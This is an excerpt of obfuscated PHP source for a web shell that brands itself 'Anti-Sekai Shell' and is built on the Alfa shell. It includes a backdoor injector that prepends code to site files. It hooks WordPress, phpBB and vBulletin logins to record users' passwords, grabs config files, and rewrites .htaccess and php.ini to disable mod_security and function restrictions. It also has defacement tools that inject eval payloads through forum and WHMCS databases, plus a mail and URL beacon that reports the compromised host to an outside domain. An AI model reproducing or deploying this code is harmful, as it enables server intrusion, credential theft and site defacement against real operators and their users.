                    ...
                    echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a class='db-opt-id' db_target='" . $db_name . "' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'" . $value . "')\"><span class='mysql_tables' style='font-weight:unset;'>" . $value . "</span></a>" . (empty($_POST["sql_count"]) ? "&nbsp;" : "\x20\x3c\163\x6d\x61\154\x6c\76\74\163\x70\141\156\x20\163\x74\x79\x6c\145\75\x27\146\x6f\156\x74\55\167\145\151\x67\x68\164\x3a\x75\156\x73\145\164\73\47\40\x63\x6c\x61\163\x73\75\x27\x6d\x79\163\x71\154\137\164\141\x62\x6c\145\x5f\x63\x6f\165\x6e\x74\x27\76\x28{$n["n"]
                }
                \x29\x3c\57\x73\160\x61\156\x3e\74\57\x73\155\141\x6c\154\76") . "</div></li>";
            }
...
goto mH0We;
Y3x3a: function __alfa_set_cookie($key, $value) {
    $_COOKIE[$key] = $value;
    @setcookie($key, $value, time() + 86400 * 7, "/");
}
goto TBK0_;
GMyQP: function alfaMarket() {
    echo "<div class='header'>";
    $curl = new AlfaCURL();
...
goto aenTk;
bdmQk: function alfaCreateParentFolder() {
    $parent = $GLOBALS["home_cwd"] . "/" . __ALFA_DATA_FOLDER__;
    if (!@is_dir($parent)) {
        @mkdir($parent, 493, true);
    }
}
goto NWp3t;
TDfCG: function Alfa_FTPC($info) {
...
goto i065L;
RaE9A: function bcinit($evalType, $evalCode, $evalOptions, $evalArguments) {
...
goto lCTLj;
xYXUJ: $kime = "byhero44@gmail.com";
goto SYfR0;
fVLMw: function GetIP() {
    ...
    if ($_POST["alfa5"] != '') {
        ...
        if ($num > 0) {
            ...
            $i++) {
                ...
                echo "\74\x74\x72\x3e\x3c\164\x64\x3e\x3c\x62\x3e\x3c\x66\157\156\164\x20\x63\157\x6c\x6f\x72\x3d\x22\43\x46\106\x46\106\106\106\x22\x3e\124\x79\x70\145\74\57\x66\157\x6e\x74\x3e\74\x2f\x74\144\76\74\x74\x64\x3e{$type
            }
            \x3c\57\164\x64\76\74\x2f\164\x72\x3e\74\x2f\x62\76";
            echo "\x3c\x74\162\76\74\x74\x64\x3e\x3c\x62\76\x3c\x66\x6f\156\164\40\x63\157\x6c\x6f\x72\75\42\x23\106\106\106\x46\106\x46\x22\76\x41\143\164\151\x76\145\74\57\x66\x6f\x6e\x74\x3e\x3c\x2f\164\x64\x3e\x3c\x74\x64\x3e{$active
        }
        \x3c\x2f\x74\144\x3e\x3c\x2f\164\x72\76\74\x2f\142\76";
        echo "\x3c\x74\x72\76\x3c\x74\x64\76\x3c\x62\76\x3c\146\x6f\x6e\x74\40\x63\x6f\x6c\x6f\162\x3d\x22\43\x46\106\x46\x46\x46\x46\42\x3e\x48\157\163\164\156\x61\x6d\x65\x3c\57\x66\x6f\x6e\x74\76\74\57\164\x64\x3e\x3c\164\x64\76{$hostname
    }
    \x3c\57\164\x64\x3e\x3c\57\x74\162\x3e\x3c\x2f\x62\76";
    echo "\74\164\162\76\x3c\x74\x64\76\x3c\142\x3e\x3c\146\x6f\156\164\40\x63\157\x6c\157\162\75\x22\43\x46\x46\x46\x46\106\106\42\76\111\160\x3c\57\x66\157\156\164\76\74\57\164\144\x3e\x3c\164\x64\76{$ipaddress
}
\74\x2f\x74\144\76\x3c\57\x74\162\x3e\x3c\x2f\142\x3e";
echo "\x3c\x74\162\x3e\74\164\x64\x3e\x3c\142\x3e\74\146\157\x6e\x74\40\143\x6f\154\x6f\x72\x3d\x22\x23\x46\106\x46\x46\106\106\x22\x3e\x55\163\x65\162\x6e\141\x6d\x65\x3c\x2f\146\x6f\x6e\x74\x3e\74\x2f\164\x64\x3e\x3c\x74\x64\76{$username
}
\74\57\x74\x64\x3e\x3c\57\164\162\x3e\x3c\57\142\x3e";
echo "\74\x74\162\x3e\74\x74\x64\76\x3c\142\x3e\x3c\x66\157\x6e\x74\40\143\157\154\157\162\x3d\x22\43\x46\106\x46\106\106\106\42\x3e\120\x61\x73\163\x77\157\x72\144\74\x2f\146\x6f\x6e\x74\76\x3c\57\x74\144\x3e\74\x74\144\x3e{$password
}
\x3c\57\164\144\76\74\57\x74\162\76\x3c\x2f\x62\76";
...
if ($num1 > 0) {
    ...
    $i++) {
        ...
        echo "<center><table border='1'>";
        echo "\x3c\164\x72\x3e\74\164\144\x3e\74\142\76\74\x66\x6f\156\164\40\143\x6f\154\x6f\x72\x3d\x22\x23\66\67\x41\102\104\106\x22\76\x52\x65\x67\x69\163\x74\145\162\74\57\146\x6f\156\164\x3e\x3c\x2f\164\x64\76\x3c\164\144\x3e{$registrar
    }
    \74\57\164\144\76\x3c\57\164\162\x3e\74\57\142\76";
    echo "\74\x74\162\x3e\x3c\x74\144\x3e\x3c\x62\76\x3c\146\157\x6e\164\40\x63\157\154\157\162\75\x22\x23\66\x37\x41\102\x44\106\x22\x3e\x53\x65\164\x74\151\156\147\x3c\x2f\x66\157\x6e\x74\76\x3c\x2f\164\144\x3e\74\x74\x64\76{$setting
}
\74\x2f\x74\144\76\74\x2f\x74\162\76\x3c\x2f\x62\x3e";
echo "\x3c\x74\162\x3e\x3c\164\x64\x3e\74\x62\x3e\x3c\x66\157\156\x74\40\143\x6f\154\x6f\162\x3d\42\43\66\67\101\102\x44\106\42\76\126\141\154\x75\145\74\57\146\157\x6e\x74\76\74\57\164\144\x3e\x3c\x74\144\76{$value
}
\74\x2f\x74\144\76\74\x2f\164\x72\x3e\74\x2f\x62\76";
echo "</table><br><br></center>";
}
}
}
...
goto EVRkm;
G5rFh: $ip_remote = $_SERVER["REMOTE_ADDR"];
goto t5i_t;
nZWXo: function reArrayFiles($file_post) {
    $file_ary = array();
...
<div class=\"txtfont\">Save Dir: </div> <input type=\"text\" name=\"zipfile\" value=\"" . $GLOBALS["cwd"] . "alfa.zip\" size=\"60\"/>\xa<input type=\"submit\" value=\" \" name=\"ziper\" />
</form></center></p>";
    if (isset($_POST["alfa5"]) && $_POST["alfa5"] == ">>") {
        $dirzip = $_POST["alfa3"];
        $zipfile = $_POST["alfa4"];
...
x1EQ3: function alfaFilesMan() {
    ...
    if (!empty($_POST["alfa1"])) {
        switch ($_POST["alfa1"]) {
            ...
            break;
            case "paste": if ($_COOKIE["alfa_act"] == "copy" && isset($_COOKIE["alfa_f"])) {
    ...
    echo "<tr id='filemanager_last_tr'><td colspan=7>\xa<input type=hidden name=a value='FilesMan'>
...
no1WM: function alfainbackdoor() {
    ...
    $textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\xa	echo('Alfa Team is Here...!');
?></textarea></p></div>";
    ...
    if ($_POST["alfa1"] == "file") {
        echo "\x3c\143\x65\156\x74\x65\x72\x3e\74\x70\x3e\x3c\x64\151\x76\40\143\154\141\x73\x73\x3d\47\x74\x78\x74\x66\157\x6e\x74\137\x68\x65\x61\x64\x65\162\x27\76\x7c\40\x49\156\40\106\x69\154\145\x20\174\74\57\x64\151\166\76\74\x2f\x70\x3e\74\x70\76\74\x66\x6f\162\155\x20\x6f\156\163\x75\x62\155\151\x74\75\42\147\50\x27\x69\x6e\142\x61\143\x6b\x64\157\157\162\47\x2c\156\165\x6c\154\54\47\146\151\154\145\47\x2c\x74\150\x69\163\56\155\145\164\x68\x6f\144\56\x76\x61\x6c\165\x65\54\x74\150\151\x73\56\146\x69\154\145\x2e\166\141\154\165\145\54\x74\x68\151\x73\x2e\163\x68\145\154\x6c\x2e\166\141\154\165\x65\x2c\x74\150\x69\163\x2e\x6b\x65\x79\56\x76\x61\154\x75\145\51\73\162\x65\164\x75\x72\156\40\146\141\154\163\x65\x3b\42\76{$select
    }
    \x20\x3c\144\151\166\40\143\154\x61\x73\x73\75\47\x74\170\164\x66\x6f\156\x74\x27\76\102\x61\143\153\144\x6f\157\x72\40\114\157\141\144\x65\x72\72\74\57\x64\x69\166\76\x20\74\151\x6e\160\165\x74\40\164\x79\x70\145\75\47\164\145\170\164\x27\x20\x6e\x61\155\145\x3d\x27\146\x69\154\x65\47\40\163\151\x7a\x65\75\47\x35\x30\x27\x20\160\154\x61\143\x65\x68\x6f\x6c\x64\x65\162\x3d\x27{$cwd
}
\47\x3e\x20\74\x64\x69\x76\x20\143\x6c\x61\x73\163\x3d\47\x74\x78\164\146\x6f\156\164\47\x3e\113\145\x79\72\x20\74\x2f\x64\x69\166\76\x20\74\x69\156\160\x75\164\x20\164\x79\160\x65\75\47\x74\x65\x78\x74\47\x20\156\x61\x6d\x65\75\x27\x6b\145\171\47\x20\x73\x69\x7a\145\75\x27\61\60\x27\x20\166\x61\154\x75\x65\75\x27\141\154\x66\141\x27\x3e\x20\74\x69\x6e\x70\165\x74\x20\x74\x79\x70\x65\75\47\163\165\x62\155\x69\x74\x27\40\x76\141\x6c\x75\145\75\47\40\47\76{$textarea
}
\74\x2f\146\x6f\x72\x6d\x3e\x3c\x2f\160\x3e\74\x2f\143\x65\156\164\x65\162\x3e";
if ($_POST["alfa2"] != '' && $_POST["alfa3"] != '' && $_POST["alfa4"] != '') {
    ...
    if (@is_file($file) && @is_writable($file)) {
        @file_put_contents($file, $code . "\xa" . @file_get_contents($file));
...
goto HQMqC;
kbaZK: function __write_file($file, $content) {
    if ($fh = @fopen($file, "wb")) {
...
goto RaE9A;
JawKW: $GLOBALS["cwd"] = isset($_POST["c"]) && @is_dir($_POST["c"]) ? $_POST["c"] : @alfaGetCwd();
goto ARjCg;
T4tMa: @ini_set("log_errors", 0);
goto k6QWv;
V43dP: define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__ ? _AlfaSecretKey() : '');
goto p7bPK;
XoS07: @ini_set("magic_quotes_runtime", 0);
goto yUzXs;
EaEwz: function alfacheckcgi() {
...
goto M8o3E;
PDQng: if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $GLOBALS["sys"] = "win";
}
else {
    $GLOBALS["sys"] = "unix";
...
goto VvCrW;
Ps9HE: $default_action = "FilesMan2";
goto X5bFn;
VPnMc: function hijackvBulletin($path, $saveto) {
    $code = <<<'ALFA_VB'
...
goto hhDYn;
YFuHS: function alfaCssLoadColors() {
    $css = '';
    foreach ($GLOBALS["__ALFA_COLOR__"] as $key => $value) {
        ...
        \x7b\x63\157\154\x6f\162\72\40{$value
    }
    \73\175";
}
else {
...
goto w_aq5;
AIhNj: if (!function_exists("mb_strlen")) {
    function mb_strlen($str, $c = '') {
        return strlen($str);
    }
}
goto AoS4g;
jES3S: function alfaphp2xml() {
    alfahead();
    AlfaNum(8, 9, 10, 7, 6, 5, 4, 3);
...
goto syUOX;
UfaAI: @mail($to_email, $server_mail, $linkcr, $header);
goto xYXUJ;
C54Or: if (!function_exists("json_encode")) {
    function json_encode($a = false) {
        ...
        if (is_scalar($a)) {
            ...
            if (is_string($a)) {
                static $jsonReplaces = array(array("\\", "/", "\xa", "\x9", "\xd", "\\b", "", "\""), array("\\\\", "\\/", "\\n", "\\t", "\\r", "\\b", "\\f", "\\\""));
...
goto q3QI0;
VvCrW: $GLOBALS["home_cwd"] = @alfaGetCwd();
goto zjozD;
tka4n: function Alfa_Rewriter($dir, $file, $defpage, $m = "index") {
    if (!@is_writable($dir)) {
        return false;
    }
    if (!@is_readable($dir)) {
...
goto xg5G9;
IkOJ2: $x = base64_decode("aHR0cHM6Ly9hbm9ueW0wdXMuY2x1Yi9sLQ==") . GetIP() . "-" . base64_encode("http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
goto D17qa;
tpBZX: @ini_set("upload_max_filesize", "9999m");
goto On9BS;
EL9aY: function alfaselfrm() {
...
goto no1WM;
qqrL1: function Alfa_ConfigGrabber($dir, $ext) {
...
foreach ($globFiles as $file) {
    ...
    if (preg_match($pattern, $filee)) {
        echo "\x3c\x64\151\166\76\x3c\x73\160\x61\x6e\76{$file
    }
    \x3c\x2f\163\x70\141\156\x3e\x20\x3c\141\40\x73\164\x79\x6c\145\x3d\47\143\165\x72\163\157\162\x3a\x70\x6f\x69\x6e\164\145\162\73\47\40\157\156\x63\x6c\x69\143\153\75\42\145\144\x69\164\157\162\x28\x27" . $file . "','auto','','','','file');\">[ View file ]</a></div>";
}
}
}
}
goto lC2ez;
On9BS: if ($config["AlfaProtectShell"]) {
    ...
    if ($config["AlfaLoginPage"] == "gui") {
        if (@$_COOKIE["AlfaUser"] != $config["AlfaUser"] && $_COOKIE["AlfaPass"] != md5($config["AlfaPass"])) {
            ...
            echo "\xa<style>\xabody{background: black;}
...
#loginbox td { border-radius:5px; font-size:11px; }\xa</style>\xa<title>~ Anti-Sekai Shell-v" . __ALFA_VERSION__ . "-" . __ALFA_CODE_NAME__ . " ~</title><center>
<center><img style=\"border-radius:100px;\" width=\"500\" height=\"250\" alt=\"Anti-Sekai\" draggable=\"false\" src=\"http://solevisible.com/images/alfa-iran.png\" /></center>\xa<div id=loginbox><p><font face=\"verdana,arial\" size=-1>\xa<center><table cellpadding='2' cellspacing='0' border='0' id='ap_table'>\xa<tr><td bgcolor=\"green\"><table cellpadding='0' cellspacing='0' border='0' width='100%'><tr><td bgcolor=\"green\" align=center style=\"padding:2;padding-bottom:4\"><b><font color=\"white\" size=-1 color=\"white\" face=\"verdana,arial\"><b>~ Anti-Sekai Shell-v" . __ALFA_VERSION__ . "-" . __ALFA_CODE_NAME__ . " ~</b></font></th></tr>
<tr><td bgcolor=\"black\" style=\"padding:5\">
<form method=\"post\">\xa<input type=\"hidden\" name=\"action\" value=\"login\">
<input type=\"hidden\" name=\"hide\" value=\"\">\xa<center><table>\xa<tr><td><font color=\"green\" face=\"verdana,arial\" size=-1>Login:</font></td><td><input type=\"text\" size=\"30\" name=\"usrname\" placeholder=\"username\" onfocus=\"if (this.value == 'username'){this.value = '';}\"></td></tr>\xa<tr><td><font color=\"green\" face=\"verdana,arial\" size=-1>Password:</font></td><td><input type=\"password\" size=\"30\" name=\"password\" placeholder=\"password\" onfocus=\"if (this.value == 'password') this.value = '';\"></td></tr>\xa<tr><td><font face=\"verdana,arial\" size=-1>&nbsp;</font></td><td><font face=\"verdana,arial\" size=-1><input type=\"submit\" value=\"Login\"></font></td></tr></table>
</div><br /></center>";
            die;
        }
    }
...
goto Za0Lw;
afhPy: function showAnimation($name) {
...
goto TTVv4;
rGW8u: define("__ALFA_POST_ENCRYPTION__", isset($GLOBALS["DB_NAME"]["post_encryption"]) && $GLOBALS["DB_NAME"]["post_encryption"] == true ? true : false);
goto V43dP;
G6rWQ: function AlfaiFrameCreator($f, $width = "100%", $height = "600px") {
    return "<iframe src=\"" . __ALFA_DATA_FOLDER__ . "/" . $f . "\" width=\"" . $width . "\" height=\"" . $height . "\" frameborder=\"0\"></iframe>";
}
goto aoyl8;
Uqa5y: function alfasafe() {
    alfahead();
...
<form onsubmit=\"g('safe',null,null,null,null,null,null,'valiases',this.site.value,null,'>>'); return false;\" method=\"post\" /><center><div class=\"txtfont\">Url: </font><input type=\"text\" placeholder=\"site.com\" name=\"site\" /> <input type=\"submit\" value=\" \" name=\"go\" /></form></center>";
        if (isset($_POST["alfa9"]) && $_POST["alfa9"] == ">>") {
            if (!_alfa_file_exists("/etc/virtual/domainowners")) {
                ...
                if (function_exists("posix_getpwuid") && function_exists("fileowner")) {
                    if ($user = @posix_getpwuid(@fileowner("\x2f\145\164\143\x2f\x76\141\154\151\x61\x73\x65\x73\x2f{$rep
                }
                "))) {
                    $user = $user["name"];
                }
            ...
            if (!empty($user) && $user != "root") {
                echo __pre() . "\x3c\x63\145\x6e\x74\x65\x72\x3e\x3c\164\x61\x62\154\145\x20\x62\157\x72\144\145\162\75\47\61\47\x3e\x3c\164\162\x3e\x3c\164\x64\76\x3c\x62\x3e\x3c\x66\x6f\156\x74\x20\x63\157\x6c\157\162\x3d\x22\43\106\106\x46\106\106\106\42\76\125\x73\145\x72\72\x20\x3c\x2f\x62\x3e\x3c\57\x66\157\156\x74\76\x3c\57\164\144\x3e\x3c\164\144\x3e\x3c\x62\76\74\146\157\156\x74\40\x63\157\x6c\157\162\75\x22\43\x46\106\60\60\x30\60\42\76{$user
            }
            \74\x2f\x66\x6f\156\164\x3e\74\x2f\x62\x3e\x3c\x2f\x74\144\x3e\74\57\x74\162\x3e\74\x74\x72\x3e\74\x74\144\x3e\x3c\x62\x3e\74\x66\157\156\164\40\143\x6f\154\157\162\x3d\42\43\106\x46\106\x46\x46\x46\x22\76\x73\x69\x74\145\x3a\40\74\57\142\x3e\74\57\146\x6f\156\x74\x3e\74\x2f\x74\x64\76\x3c\164\x64\x3e\74\x62\x3e\x3c\146\157\x6e\x74\x20\x63\x6f\x6c\x6f\x72\75\42\x23\106\x46\x30\60\60\x30\x22\x3e{$rep
        }
        \74\x2f\146\157\x6e\164\76\74\57\142\x3e\74\57\164\x64\x3e\x3c\57\x74\162\x3e\x3c\57\164\141\142\x6c\x65\x3e\74\57\143\145\x6e\164\x65\x72\x3e";
    }
    else {
    ...
    foreach ($users as $boz) {
        $ex = explode(":", $boz);
        if ($ex[0] == $rep) {
            echo __pre() . "<center><table border='1'>\xa<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">" . trim($ex[1]) . "\x3c\57\146\157\156\x74\x3e\x3c\57\142\x3e\x3c\57\164\x64\x3e\74\x2f\x74\162\76\xa\74\164\162\76\x3c\x74\x64\x3e\74\142\76\74\146\x6f\x6e\x74\40\143\157\154\x6f\162\x3d\42\43\x46\106\x46\x46\106\106\x22\76\x73\151\x74\145\72\40\74\x2f\x62\x3e\74\x2f\146\x6f\156\164\x3e\x3c\57\x74\144\76\x3c\164\x64\x3e\74\142\76\74\146\x6f\156\x74\40\x63\x6f\x6c\x6f\x72\x3d\42\43\x46\106\60\x30\x30\x30\42\76{$rep
        }
        \74\x2f\x66\x6f\156\x74\76\x3c\x2f\x62\76\74\57\164\144\x3e\x3c\x2f\x74\162\76\x3c\x2f\164\141\x62\154\145\76\74\x2f\143\x65\x6e\x74\x65\162\x3e";
        break;
    }
}
}
...
if (!empty($_POST["alfa2"]) && isset($_POST["alfa2"])) {
    @__write_file($GLOBALS["cwd"] . ".htaccess", "#Generated By Sole Sad and Invisible\xa<IfModule mod_security.c>\xaSec------Engine Off
Sec------ScanPOST Off
</IfModule>");
...
disable_functions=ByPassed By Sole Sad & Invisible(Anti-Sekai)");
    echo "<center><b><big> php.ini created...!</center></b></big>";
}
if (!empty($_POST["alfa3"]) && isset($_POST["alfa3"])) {
    @__write_file($GLOBALS["cwd"] . ".htaccess", "#Generated By Sole Sad and Invisible\xa<Files *.php>
ForceType application/x-httpd-php4
</Files>\xa<IfModule mod_security.c>\xaSecFilterEngine Off
...
goto y3qdQ;
p3VR9: $GLOBALS["glob_chdir_false"] = false;
goto WlxsZ;
hhDYn: function hijackwp($path, $saveto) {
    $code = <<<'ALFA_WP'
$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST['log']." : ".$_POST['pwd']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);
ALFA_WP;
...
goto vKu26;
mCkpZ: @error_reporting(E_ALL ^ E_NOTICE);
goto nd1ks;
vZk8p: if (!isset($GLOBALS["DB_NAME"]["show_icons"])) {
    die($GLOBALS["DB_NAME"]["show_icons"]);
}
goto pGybD;
vZEXP: function alfawhois() {
...
goto fCho4;
XWgA2: function _alfa_can_runCommand($cgi = true, $cache = true) {
...
goto Sb05S;
Sb05S: function _alfa_symlink($target, $link) {
...
goto Y0C_c;
TC4zO: if (!$function_exists_func("b" . "a" . "se64" . "_en" . "c" . "ode" . '')) {
    function vcnvSCZgBz($data) {
        ...
        do {
            $o1 = $char_code_at_func($data, $i++);
            $o2 = $char_code_at_func($data, $i++);
            $o3 = $char_code_at_func($data, $i++);
            $bits = $o1 << 16 | $o2 << 8 | $o3;
            $h1 = $bits >> 18 & 63;
            $h2 = $bits >> 12 & 63;
            $h3 = $bits >> 6 & 63;
...
goto DYTtg;
oU1FW: function alfacheckfiletype() {
    $path = $_POST["path"];
    $arg = $_POST["arg"];
    if (@is_file($path . "/" . $arg)) {
        echo "file";
...
goto nc8td;
STies: function hijackPHPBB($path, $saveto) {
    $code = <<<'ALFA_PHPBB'
$Alfa_u = request_var('username', '');$Alfa_p = request_var('password', '');if($Alfa_u != '' AND $Alfa_p != ''){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response['status'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response['user_row']['user_email']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}
ALFA_PHPBB;
    $find = "case 'login':";
    $code = str_replace("{saveto_path}", $saveto, $code);
    $login = $path . "/ucp.php";
...
goto mlcbl;
Kcw05: function __alert($s) {
    echo "<center>" . __pre() . $s . "</center>";
}
goto xRpjd;
dCqmb: function __alfaziper($source, $destination) {
...
goto bHfQ_;
mhKg4: define("__ALFA_UPDATE__", "2");
goto UE2Vq;
ARjCg: if ($GLOBALS["glob_chdir_false"]) {
    $GLOBALS["cwd"] = isset($_POST["c"]) && !empty($_POST["c"]) ? $_POST["c"] : @alfaGetCwd();
}
goto j4Vrs;
mM1DM: function alfaconnect() {
    alfahead();
    ...
    foreach ($cbArr as $key => $val) {
        echo "\74\x6f\160\164\x69\157\x6e\40\166\141\x6c\165\145\75\47{$key
    }
    \47\40" . ($GLOBALS["sys"] == "win" ? "selected" : '') . "\76{$val
}
\74\57\157\x70\164\x69\x6f\x6e\x3e";
}
...
echo "\74\160\x72\145\x20\143\154\x61\163\163\x3d\47\155\x6c\x31\x27\x20\x73\x74\171\x6c\x65\x3d\47\155\x61\162\x67\x69\x6e\55\x74\157\x70\x3a\x35\160\170\47\x3e{$out
}
\74\57\160\x72\x65\x3e";
}
}
else {
...
if ($lang == "java" || $lang == "c") {
    ...
    echo "\x3c\x70\x72\x65\x20\143\154\141\163\x73\x3d\155\154\61\40\x73\x74\171\x6c\145\75\x27\155\x61\x72\147\x69\x6e\55\164\x6f\x70\x3a\x35\x70\170\47\x3e\74\x63\145\x6e\x74\145\162\x3e{$out
}
\74\x2f\143\145\x6e\164\145\162\x3e\x3c\x2f\160\162\145\x3e";
}
if ($lang == "bcwin") {
    $alfa = new AlfaCURL();
...
";
        if (ctype_xdigit($packetContent)) {
            ...
            $packetContent = str_replace(array("\xd", "
"), '', $packetContent);
...
 ");
                ...
                fclose($sock);
                echo "\x3c\143\x65\x6e\x74\145\162\x3e\x3c\x70\76\x50\157\x72\x74\x20\x3c\x66\x6f\156\164\40\x73\x74\x79\154\145\x3d\47\143\x6f\154\157\x72\x3a\43\x44\x45\x33\x45\63\x45\47\x3e{$i
            }
            \74\x2f\146\x6f\156\164\x3e\x20\x69\x73\40\x6f\160\x65\156\x3c\57\x70\76";
...
goto en2SE;
K2Mxs: function Alfa_Call_Function_Cracker($method, $info) {
    switch ($method) {
...
goto nZyot;
u53s2: $header = "\106\162\157\155\72\x20{$from_shellcode
}
\xd\xa\x52\x65\160\x6c\x79\x2d\x74\x6f\x3a\x20{$from_shellcode
}
";
goto UfaAI;
pICqI: function alfa_getColor($target) {
...
goto pICqI;
xuAGm: function _alfa_load_ace_options($base) {
...
goto MgL7N;
f6ORX: if (!isset($GLOBALS["DB_NAME"]["user"])) {
    die($GLOBALS["DB_NAME"]["user"]);
}
goto NCiby;
RWsOn: define("ALFA_TEMPDIR", function_exists("sys_get_temp_dir") ? @is_writable(str_replace("\\", "/", sys_get_temp_dir())) ? sys_get_temp_dir() : (@is_writable(".") ? "." : false) : false);
goto srWDq;
JcRxG: foreach ($GLOBALS["DB_NAME"] as $key => $value) {
...
goto qbr_d;
m2YF9: function alfaIndexChanger() {
    alfahead();
    ...
    if (isset($_POST["alfa3"]) && $_POST["alfa3"] == "whmcs") {
        echo __pre();
        echo "<center><center><div class='txtfont_header'>| Whmcs |</div>\xa<p><center>" . getConfigHtml("whmcs") . "<form onSubmit=\"g('IndexChanger',null,null,null,'whmcs',this.fname.value,this.path.value,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\">
";
...
<input type='submit' value=' '>\xa</form></center></center>";
        if (isset($_POST["alfa6"])) {
            ...
            if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) {
                ...
                $inject = "\x55\x50\x44\x41\124\105\x20\x74\x62\x6c\x65\155\141\151\154\x74\145\x6d\160\154\141\x74\x65\163\x20\123\x45\x54\x20\155\x65\163\x73\141\147\x65\x3d\47{$Def
            }
            \x27\x20\x57\110\x45\122\x45\x20\156\141\x6d\x65\75\x27\x50\141\163\x73\167\157\162\x64\x20\x52\145\163\145\164\x20\126\x61\x6c\x69\144\x61\x74\x69\x6f\156\47";
            ...
            if (function_exists("curl_version")) {
                ...
                $AlfaSole->Send($path . "/pwreset.php", "post", "\x74\x6f\153\x65\x6e\x3d{$token[1]
            }
            \46\x61\143\x74\x69\x6f\156\75\162\145\163\x65\164\46\145\155\141\151\x6c\x3d\x73\x6f\x6c\145\166\151\x73\x69\142\x6c\145\100\x66\142\151\x2e\147\157\x76");
            $backdata = "\x55\x50\x44\101\124\105\x20\x74\142\x6c\x65\x6d\x61\151\x6c\x74\145\155\160\x6c\x61\164\145\163\40\x53\105\124\x20\x6d\145\163\x73\x61\x67\x65\x3d\47{$tempSave
        }
        \x27\x20\127\110\x45\122\x45\x20\x6e\141\155\145\75\47\x50\x61\x73\163\x77\x6f\x72\x64\x20\122\x65\x73\x65\164\40\126\x61\154\x69\x64\141\164\x69\x6f\156\47";
...
if (isset($_POST["alfa1"]) && $_POST["alfa1"] == "vb") {
    echo __pre();
    echo "<center><center><div class='txtfont_header'>| vBulletin |</div>\xa<p><center>" . getConfigHtml("vb") . "<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
";
    ...
    create_table($table);
    echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>\xa<input type='submit' value=' '></form></center></center>";
    if ($_POST["alfa8"] == ">>") {
        $s0levisible = "Powered By Solevisible";
        $dbu = $_POST["alfa2"];
        $dbn = $_POST["alfa3"];
        ...
        $prefix = $_POST["alfa7"];
        $index = str_replace("\\'", "'", $index);
        $set_index = '{${eval(base64_decode(\\\'' . __ZW5jb2Rlcg("\145\x63\x68\157\x20\x22{$index}\x22\x3b") . "\\'))}}{${exit()}}";
    if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) {
        $conn = @mysqli_connect($dbh, $dbu, $dbp, $dbn) or die(mysqli_error($conn));
...
if (isset($_POST["alfa2"]) && $_POST["alfa2"] == "mybb") {
    echo __pre();
    echo "<center><center><div class='txtfont_header'>| Mybb |</div>\xa<p><center>" . getConfigHtml("mybb") . "<form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
";
    ...
    create_table($table);
    echo "<br><div class='txtfont'>| Your Index |</div><br>\xa<textarea name=mybbindex rows='19' cols='103'>
...
goto lQrY_;
D207Q: function alfaShellInjectors() {
    alfahead();
    echo "<div class=header>";
    AlfaNum(11);
    ...
    if (isset($_POST["alfa1"]) && $_POST["alfa1"] == "whmcs") {
        ...
        if (isset($_POST["alfa6"])) {
            ...
            $newindex = "\x3c\x70\76\x44\145\141\162\40{$newin
        }
        \54\x3c\57\160\76\74\160\x3e\122\145\143\x65\x6e\164\154\171\x20\x61\40\x72\x65\x71\165\x65\163\x74\x20\167\141\x73\40\163\165\x62\155\151\x74\x74\145\x64\x20\164\157\x20\162\x65\163\x65\x74\x20\171\x6f\x75\x72\x20\x70\141\x73\163\x77\x6f\x72\x64\40\146\157\x72\x20\157\165\x72\x20\143\x6c\151\145\x6e\x74\x20\x61\x72\x65\x61\x2e\40\111\146\40\171\157\x75\x20\x64\x69\144\40\x6e\x6f\x74\40\x72\145\x71\x75\x65\163\x74\x20\164\x68\151\x73\x2c\40\x70\x6c\x65\x61\x73\x65\40\x69\147\156\x6f\162\x65\40\164\x68\x69\x73\40\145\x6d\x61\x69\154\x2e\x20\x49\164\x20\167\x69\x6c\154\40\x65\x78\160\151\x72\145\x20\x61\156\144\40\142\x65\143\157\x6d\145\x20\165\163\x65\x6c\x65\163\x73\40\151\156\x20\x32\x20\x68\x6f\x75\162\163\40\x74\x69\x6d\145\x2e\x3c\57\x70\x3e\x3c\160\76\124\157\40\162\x65\x73\x65\164\40\x79\157\x75\162\x20\x70\141\163\163\x77\x6f\x72\144\54\40\160\154\145\141\163\145\40\x76\151\163\x69\164\x20\164\150\145\x20\x75\162\154\x20\142\145\x6c\157\x77\x3a\x3c\x62\162\40\x2f\76\x3c\x61\40\150\162\x65\x66\75\x22\173\x24\160\167\137\162\145\x73\145\x74\x5f\x75\162\154\x7d\42\x3e\173\x24\x70\167\137\x72\x65\163\145\164\x5f\165\x72\154\x7d\74\57\141\76\x3c\57\160\76\74\x70\x3e\x57\x68\x65\x6e\x20\x79\x6f\x75\x20\166\151\x73\x69\164\x20\164\150\x65\x20\x6c\151\x6e\153\40\141\142\157\166\145\54\x20\x79